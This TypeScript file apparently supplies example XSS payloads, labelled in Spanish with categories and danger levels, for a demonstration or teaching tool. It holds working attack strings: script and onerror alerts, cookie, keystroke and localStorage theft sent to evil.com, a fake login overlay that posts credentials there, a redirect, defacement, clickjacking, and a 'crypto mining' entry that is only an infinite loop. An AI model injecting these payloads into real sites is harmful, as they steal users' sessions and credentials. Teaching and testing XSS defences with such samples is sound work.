import type { ExamplePayload } from '../interface/ExamplePayload';

export const examplePayloads: ExamplePayload[] = [
  {
    label: 'Alert Básico',
    value: '<script>alert("XSS Detectado!")</script>',
    description: 'Script básico de alerta',
    category: 'basic',
    dangerLevel: 1,
  },
  {
    label: 'Alert con HTML',
    value: '<img src="x" onerror="alert(\'XSS via onerror\')">',
    description: 'XSS usando evento onerror de imagen',
    category: 'basic',
    dangerLevel: 1,
  },
  {
    label: 'Robo de Cookies',
    value:
      '<script>fetch("https://evil.com/steal?c=" + document.cookie)</script>',
    description: 'Envía cookies a servidor atacante',
    category: 'stealing',
    dangerLevel: 3,
  },
  {
    label: 'Keylogger',
    value:
      '<script>document.onkeypress = function(e) { fetch("https://evil.com/log?key=" + e.key) }</script>',
    description: 'Registra todas las teclas presionadas',
    category: 'stealing',
    dangerLevel: 3,
  },
  {
    label: 'Redirección',
    value: '<script>window.location = "https://evil.com"</script>',
    description: 'Redirige a sitio malicioso',
    category: 'phishing',
    dangerLevel: 2,
  },
  {
    label: 'Fake Login',
    value:
      '<div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999;"><div style="margin: 100px auto; width: 300px; padding: 20px; background: white;"><h3>Session Expired</h3><input placeholder="Username" id="u"><input placeholder="Password" type="password" id="p"><button onclick="fetch(\'https://evil.com/creds?u=\'+document.getElementById(\'u\').value+\'&p=\'+document.getElementById(\'p\').value)">Login</button></div></div>',
    description: 'Formulario falso para phishing',
    category: 'phishing',
    dangerLevel: 3,
  },
  {
    label: 'Defacement',
    value:
      '<script>document.body.innerHTML = \'<h1 style="color:red;text-align:center;">HACKED</h1>\'</script>',
    description: 'Modifica completamente la página',
    category: 'defacement',
    dangerLevel: 2,
  },
  {
    label: 'Minería Crypto',
    value:
      '<script>var miner=new Worker("data:application/javascript;base64,"+btoa(\'while(true){}\'));</script>',
    description: 'Minería de criptomonedas en background',
    category: 'advanced',
    dangerLevel: 3,
  },
  {
    label: 'Clickjacking',
    value:
      '<iframe src="https://your-site.com" style="opacity:0;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"></iframe>',
    description: 'Iframe invisible para clickjacking',
    category: 'advanced',
    dangerLevel: 2,
  },
  {
    label: 'Steal LocalStorage',
    value:
      '<script>fetch("https://evil.com/steal?ls=" + JSON.stringify(localStorage))</script>',
    description: 'Roba datos del LocalStorage',
    category: 'stealing',
    dangerLevel: 3,
  },
];

export const payloadsByCategory = {
  basic: examplePayloads.filter((p) => p.category === 'basic'),
  stealing: examplePayloads.filter((p) => p.category === 'stealing'),
  phishing: examplePayloads.filter((p) => p.category === 'phishing'),
  defacement: examplePayloads.filter((p) => p.category === 'defacement'),
  advanced: examplePayloads.filter((p) => p.category === 'advanced'),
};
